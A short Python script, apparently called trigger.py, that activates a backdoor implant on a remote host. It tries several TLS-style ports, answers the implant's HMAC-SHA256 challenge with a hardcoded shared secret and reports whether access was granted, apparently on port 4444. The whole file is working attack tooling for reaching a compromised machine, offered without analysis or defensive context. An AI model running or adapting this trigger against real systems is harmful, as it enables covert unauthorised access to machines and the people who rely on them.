import hmac
import hashlib
import socket
import sys

# Read host address from stdin (first line)
# Note: If you want to run this like "python3 trigger.py 172.x.x.x" 
# change the next line to: HOST = sys.argv[1].strip()
HOST = sys.stdin.readline().strip()

if not HOST:
    print("[-] Error: No host provided")
    sys.exit(1)

SharedSecret = "bluewinstheday!!"
PORTS_TO_TRY = [443, 8443, 10443, 4443]

connected_socket = None
connected_port = None

# 1. Loop through the ports to find the active listener
for port in PORTS_TO_TRY:
    try:
        print(f"[*] Trying {HOST}:{port}...")
        s = socket.socket()
        s.settimeout(3.0)  # 3-second timeout so it doesn't hang on filtered ports
        s.connect((HOST, port))
        
        # If connect() succeeds, we save the socket and break the loop
        connected_socket = s
        connected_port = port
        print(f"[+] Successfully connected to port {port}!")
        break
    except Exception as e:
        print(f"[-] Failed on port {port}: {e}")
        s.close()

# 2. Exit if all ports failed
if not connected_socket:
    print("\n[-] Error: Could not connect to any trigger ports. Is the implant running?")
    sys.exit(1)

# 3. Proceed with HMAC Challenge on the successful socket
try:
    # Reset timeout to a normal value for the challenge exchange
    connected_socket.settimeout(20.0)
    
    # Receive challenge
    challenge_data = connected_socket.recv(4096).decode().strip()
    
    if not challenge_data or ":" not in challenge_data:
        print("[-] Error: Received invalid challenge format from server.")
        sys.exit(1)
        
    challenge = challenge_data.split(":")[1]

    # Compute HMAC-SHA256
    mac = hmac.new(
        SharedSecret.encode(), 
        challenge.encode(), 
        hashlib.sha256
    ).hexdigest()

    # Send response
    connected_socket.send((mac + "\n").encode())

    # Print server response ("OK - Using port 4444" or "DENIED")
    response = connected_socket.recv(4096).decode().strip()
    print(f"[*] Server response: {response}")

except Exception as e:
    print(f"[-] Error during HMAC authentication: {e}")
finally:
    connected_socket.close()